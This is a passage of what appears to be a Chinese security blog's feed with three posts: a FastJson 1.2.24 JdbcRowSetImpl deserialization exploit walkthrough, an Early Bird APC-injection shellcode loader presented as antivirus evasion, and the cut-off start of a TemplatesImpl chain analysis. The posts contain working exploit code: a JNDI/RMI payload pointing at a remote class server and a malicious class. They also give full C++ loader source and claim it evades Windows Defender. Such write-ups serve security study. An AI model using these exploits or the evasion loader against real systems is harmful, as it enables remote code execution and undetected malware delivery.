    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在<code>JdbcRowSetImpl</code>链会用到JNDI以及RMI的相关知识，这两方面的知识我都有学习过，师傅们可以看看我之前的文章。</p><h1 id="2-漏洞影响范围"><a href="#2-漏洞影响范围" class="headerlink" title="2.漏洞影响范围"></a>2.漏洞影响范围</h1><p><code>FastJson&lt;=1.2.24</code></p><h1 id="3-环境搭建"><a href="#3-环境搭建" class="headerlink" title="3.环境搭建"></a>3.环境搭建</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="4-利用链复现"><a href="#4-利用链复现" class="headerlink" title="4.利用链复现"></a>4.利用链复现</h1><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        String pocString = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/reference\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br>        JSON.parse(pocString);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>RmiServer</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RmiServer</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Reference reference = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;whatever&quot;</span>,<span class="hljs-string">&quot;EvilObject&quot;</span>,<span class="hljs-string">&quot;http://192.168.199.246:4444/&quot;</span>);<br>        System.out.println(reference);<br>        ReferenceWrapper referenceWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(reference);<br>        registry.bind(<span class="hljs-string">&quot;reference&quot;</span>,referenceWrapper);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>恶意类<code>EvilObject</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EvilObject</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">EvilObject</span><span class="hljs-params">()</span></span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;deepin-calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>将其编译后，放置在HTTP服务器上。</p><p>执行完POC后，可以发现成功调用了服务器上的恶意类并执行。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><h1 id="5-利用链分析"><a href="#5-利用链分析" class="headerlink" title="5.利用链分析"></a>5.利用链分析</h1><p>​    我之前跟过<code>FastJson</code>的<code>TemplatesImp</code>链，知道在<code>FastJson</code> 中有一个<code>@type</code> 参数，能将我们反序列化后的类转为<code>@type</code> 中指定的类，然后在反序列化过程中会自动调用类中的<code>setter</code> <code>getter</code> 和构造器。</p><p>找到对应的反序列化器后，就拿来处理我们的反序列化数据。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><p>之后就就像之前分析<code>TemplatesImp</code>链一样，最后用反射调用了<code>com.sun.rowset.JdbcRowSetImpl</code>的<code>setAutoCommit</code>方法：</p><p>跟进该方法：</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>跟进<code>connect</code>方法：</p><p>​    发现利用了<code>jndi</code>，那么我们如果控制了 <code>dataSourceName</code>就可以利用 <code>JNDI</code> 注入（可以看我之前的文章）让客户端进行命令执行了，而这里<code>dataSourceName</code>恰恰可以控制，所以此处远程加载了我们HTTP服务上的恶意<code>class</code>。</p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><p><img src="/2021/04/24/Java%E5%AE%89%E5%85%A8-FastJson%E4%B9%8BJdbcRowSetImpl%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h1><p>在分析完之后我们再来梳理一下，产生漏洞的原因，以及1.2.24 中利用方法的限制</p><ol><li><code>TemplatesImpl</code> 链 优点：当<code>fastjson</code>不出网的时候可以直接进行盲打（配合时延的命令来判断命令是否执行成功） 缺点：版本限制 1.2.22 起才有<code>SupportNonPublicField</code>特性，并且后端开发需要特定语句才能够触发，在使用<code>parseObject</code>的时候，必须要使用 <code>JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)</code></li><li><code>JdbcRowSetImpl </code>链的优点：利用范围更广，即触发更为容易 ；缺点：当<code>fastjson </code>不出网的话这个方法基本上也是无法使用的了，同时高版本jdk中<code>codebase</code>默认为true，这样意味着，我们只能加载受信任的地址。</li></ol><h1 id="7-参考链接"><a href="#7-参考链接" class="headerlink" title="7.参考链接"></a>7.参考链接</h1><p><a href="https://www.anquanke.com/post/id/87300">https://www.anquanke.com/post/id/87300</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    在&lt;code&gt;JdbcRowSetImpl&lt;/code&gt;链会用到JNDI以及RMI的相关知识，这两方面的知识我都有</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>免杀-内存注入之Early-BIRD技术的应用</title>
    <link href="https://reader-l.github.io/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <id>https://reader-l.github.io/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/</id>
    <published>2021-04-20T13:17:25.000Z</published>
    <updated>2021-04-26T03:04:05.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Early-Bird简介"><a href="#1-Early-Bird简介" class="headerlink" title="1.Early Bird简介"></a>1.Early Bird简介</h1><p>​    Early Bird是一种简单而强大的技术，由于线程初始化时会调用<code>ntdll</code>未导出函数<code>NtTestAlert</code>，该函数会清空并处理<code>APC</code>队列，所以注入的代码通常在进程的主线程的入口点之前运行并接管进程控制权，从而避免了反恶意软件产品的钩子的检测，同时获得一个合法进程的环境信息。</p><p>​    挂钩是在进程开始运行时由合法的反恶意软件产品插入的代码段。它们放在特定的Windows API调用上。挂钩的目的是监视API调用及其参数，以查找恶意调用或调用模式。</p><h1 id="2-程序编写"><a href="#2-程序编写" class="headerlink" title="2.程序编写"></a>2.程序编写</h1><h2 id="1-流程如下"><a href="#1-流程如下" class="headerlink" title="1.流程如下"></a>1.流程如下</h2><ol><li>创建一个挂起的进程(通常是windows的合法进程)</li><li>在挂起的进程内申请一块可读可写可执行的内存空间</li><li>往申请的空间内写入<code>shellcode</code></li><li>将<code>APC</code>插入到该进程的主线程</li><li>恢复挂起进程的线程</li></ol><h2 id="2-相关的API"><a href="#2-相关的API" class="headerlink" title="2.相关的API"></a>2.相关的API</h2><p>创建进程API</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span>CreateProcessA(<br>  LPCSTR                lpApplicationName,<br>  LPSTR                 lpCommandLine,<br>  LPSECURITY_ATTRIBUTES lpProcessAttributes,<br>  LPSECURITY_ATTRIBUTES lpThreadAttributes,<br>  <span class="hljs-keyword">BOOL </span>                 <span class="hljs-keyword">bInheritHandles,</span><br><span class="hljs-keyword"> </span> DWORD                 dwCreationFlags,<br>  LPVOID                lpEnvironment,<br>  LPCSTR                lpCurrentDirectory,<br>  LPSTARTUPINFOA        lpStartupInfo,<br>  LPPROCESS_INFORMATION lpProcessInformation<br>);<br></code></pre></td></tr></table></figure><p>申请内存API</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">LPVOID VirtualAllocEx(<br>  HANDLE hProcess,<br>  LPVOID lpAddress,<br>  SIZE_T dwSize,<br>  <span class="hljs-built_in">DWORD</span>  flAllocationType,<br>  <span class="hljs-built_in">DWORD</span>  flProtect<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>在指定的进程中将数据写入内存区域。</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs lasso">BOOL WriteProcessMemory(<br>  <span class="hljs-keyword">HANDLE</span>  hProcess,<br>  LPVOID  lpBaseAddress,<br>  LPCVOID lpBuffer,<br>  SIZE_T  nSize,<br>  SIZE_T  *lpNumberOfBytesWritten<br>);<br></code></pre></td></tr></table></figure><p>本次实验的重点：<code>QueueUserAPC</code></p><p>将用户模式异步过程调用（APC）对象添加到指定线程的APC队列中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">DWORD <span class="hljs-title">QueueUserAPC</span><span class="hljs-params">(</span></span><br><span class="hljs-function"><span class="hljs-params">  PAPCFUNC  pfnAPC,</span></span><br><span class="hljs-function"><span class="hljs-params">  HANDLE    hThread,</span></span><br><span class="hljs-function"><span class="hljs-params">  ULONG_PTR dwData</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span>;<br></code></pre></td></tr></table></figure><p>本次实验用来恢复挂起的进程的线程。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">DWORD</span> <span class="hljs-function"><span class="hljs-title">ResumeThread</span>(</span><br><span class="hljs-function">  <span class="hljs-variable">HANDLE</span> <span class="hljs-variable">hThread</span></span><br><span class="hljs-function">);</span><br></code></pre></td></tr></table></figure><h2 id="3-完整代码"><a href="#3-完整代码" class="headerlink" title="3.完整代码"></a>3.完整代码</h2><p>如下代码还是将<code>shellcode</code>和加载器进行分离。如下代码作为示例，所以我并没有将我们的<code>shellcode</code>进行加密操作。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tchar.h&gt;</span></span><br><br><br><span class="hljs-keyword">int</span> _tmain(<span class="hljs-keyword">int</span> argc, _TCHAR* argv[]) &#123;<br><span class="hljs-comment">//获取shellcode</span><br>DWORD dwread = <span class="hljs-number">0</span>;<br>HANDLE  hFile = CreateFile(argv[<span class="hljs-number">1</span>], GENERIC_ALL, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, OPEN_EXISTING, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>DWORD shellcode_size = GetFileSize(hFile, <span class="hljs-literal">NULL</span>);<br>LPVOID shellcode = VirtualAlloc(<span class="hljs-literal">NULL</span>, shellcode_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>ReadFile(hFile, shellcode, shellcode_size, &amp;dwread, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// Create a 64-bit process: </span><br>STARTUPINFOA si;<br>PROCESS_INFORMATION pi;<br>LPVOID shellcode_memory;<br>SIZE_T memory_size = (SIZE_T)shellcode_size;<br>HANDLE hProcess, hThread;<br><br><br>ZeroMemory(&amp;si, <span class="hljs-keyword">sizeof</span>(si));<br>ZeroMemory(&amp;pi, <span class="hljs-keyword">sizeof</span>(pi));<br><br><br>si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>si.dwFlags = STARTF_USESHOWWINDOW;<br>si.wShowWindow = SW_HIDE;<br><br><br>CreateProcessA(<span class="hljs-string">&quot;C:\\windows\\system32\\notepad.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE,<br>CREATE_NO_WINDOW, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi);<br><br><span class="hljs-comment">//Execute the process</span><br>shellcode_memory = VirtualAllocEx(pi.hProcess, <span class="hljs-literal">NULL</span>, memory_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>WriteProcessMemory(pi.hProcess, shellcode_memory, shellcode, memory_size, <span class="hljs-literal">NULL</span>);<br>QueueUserAPC((PAPCFUNC)shellcode_memory, pi.hThread, <span class="hljs-literal">NULL</span>);<br>ResumeThread(pi.hThread);<br>CloseHandle(pi.hThread);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功连接。</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/1.png"></p><p>其实仔细阅读代码，可以发现APC（异步过程调用）在其中的作用可以说是替代了<code>CreateRemoteThread</code>方法。</p><h2 id="4-配合加密的查杀效果"><a href="#4-配合加密的查杀效果" class="headerlink" title="4.配合加密的查杀效果"></a>4.配合加密的查杀效果</h2><p>windows defender是没有查杀到的。</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/2.png"></p><p>常见的国产杀软没有查到</p><p><img src="/2021/04/20/%E5%85%8D%E6%9D%80-%E5%86%85%E5%AD%98%E6%B3%A8%E5%85%A5%E4%B9%8BEarly-BIRD%E6%8A%80%E6%9C%AF%E7%9A%84%E5%BA%94%E7%94%A8/3.png"></p><h1 id="3-完整程序链接"><a href="#3-完整程序链接" class="headerlink" title="3.完整程序链接"></a>3.完整程序链接</h1><p><a href="https://github.com/ReadER-L/BypassSecuritySoftware">https://github.com/ReadER-L/BypassSecuritySoftware</a></p><h1 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4.参考链接"></a>4.参考链接</h1><p><a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls">https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls</a></p><p><a href="https://idiotc4t.com/code-and-dll-process-injection/apc-injection#apc-jian-jie">https://idiotc4t.com/code-and-dll-process-injection/apc-injection#apc-jian-jie</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Early-Bird简介&quot;&gt;&lt;a href=&quot;#1-Early-Bird简介&quot; class=&quot;headerlink&quot; title=&quot;1.Early Bird简介&quot;&gt;&lt;/a&gt;1.Early Bird简介&lt;/h1&gt;&lt;p&gt;​    Early Bird是一种简单而强</summary>
      
    
    
    
    <category term="免杀" scheme="https://reader-l.github.io/categories/%E5%85%8D%E6%9D%80/"/>
    
    
  </entry>
  
  <entry>
    <title>FastJason-1.2.22-1.2.24-TemplatesImpl利用链分析</title>
    <link href="https://reader-l.github.io/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <id>https://reader-l.github.io/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</id>
    <published>2021-04-17T11:00:23.000Z</published>
    <updated>2021-04-24T07:54:27.435Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    FastJson是alibaba的一款开源JSON解析库，可用于将Java对象转换为其JSON表示形式，也可以用于将JSON字符串转换为等效的Java对象。</p><p>​    这几年一直都有听说过fastjson出现过RCE的漏洞，但是都没有好好仔细的研究学习。最近打算好好阅读大佬们的文章进行学习。</p><h1 id="2-FastJson简单使用及分析"><a href="#2-FastJson简单使用及分析" class="headerlink" title="2.FastJson简单使用及分析"></a>2.FastJson简单使用及分析</h1><h2 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h2><p>​    用IDEA的Maven创建一个空的项目后，在pom.xml中添加依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.24<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1.png"></p><h2 id="2-简单的序列化和反序列化"><a href="#2-简单的序列化和反序列化" class="headerlink" title="2.简单的序列化和反序列化"></a>2.简单的序列化和反序列化</h2><h3 id="1-序列化"><a href="#1-序列化" class="headerlink" title="1.序列化"></a>1.序列化</h3><p>Persion Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String Id;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUserId</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用getUserId方法&quot;</span>);<br>        <span class="hljs-keyword">return</span> Id;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUserId</span><span class="hljs-params">(String id)</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用setUserId&quot;</span>);<br>        <span class="hljs-keyword">this</span>.Id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;UserId&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;UserId=&#x27;&quot;</span> + Id + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>​    我们尝试调用FastJson的序列化方法：<code>JSON.toJSONString()</code>将对象序列化成Json字符串，发现<code>FastJson</code>会在序列化的过程中自动调用了类中的 <code>getter</code>构造函数。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/2.png"></p><h3 id="2-反序列化"><a href="#2-反序列化" class="headerlink" title="2.反序列化"></a>2.反序列化</h3><p>反序列化有两个方法，分别是<code>JSON.parseObject()</code>、<code>JSON.paese()</code>。</p><h4 id="这两个方法是有区别的："><a href="#这两个方法是有区别的：" class="headerlink" title="这两个方法是有区别的："></a>这两个方法是有区别的：</h4><p>1.反序列化数据的时候，调用目标类的方法不同。（主要原因在<code>@type</code>参数，下文分析。）</p><p>调用<code>JSON.parseObject()</code>反序列化数据的时候，会直接调用<code>setter</code>和<code>getter</code>方法，同时会调用构造方法。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/3.png"></p><p>调用<code>JSON.parse()</code>反序列化数据的时候，会直接调用构造方法以及<code>setter</code>方法。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/4.png"></p><p>2.这两个方法返回的对象是不同的。</p><p><code>JSON.parseObject()</code>返回的类是<code>com.alibaba.fastjson.JSONObject</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/5.png"></p><p><code>JSON.parse()</code>返回的类是<code>FastjsonTest.Person</code></p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/6.png"></p><p>但是我们可以通过在<code>JSON.parseObject()</code>方法的参数中传入<code>Object.class</code>，从而达到和parse相同的效果。</p><p><img src="/2021/04/17/FastJason-1-2-22-1-2-24-TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/7.png"></p><h2 id="3-type参数"><a href="#3-type参数" class="headerlink" title="3.@type参数"></a>3.@type参数</h2><p>​    我们在上面调用<code>JSON.parseObject()</code>和``JSON.parse()<code>方法时，我们有用到该参数。在</code>FastJson<code> 中有一个</code>@type<code> 参数，能将我们反序列化后的类转为</code>@type<code> 中指定的类，然后在反序列化过程中会自动调用类中的</code>setter<code> </code>getter` 和构造器。</p><p>​    尝试利用该特定调用恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FastjsonTest;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Evil</span><span class="hljs-params">()</span></span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了构造方法&quot;</span>);<br>    &#125;<br>    <span 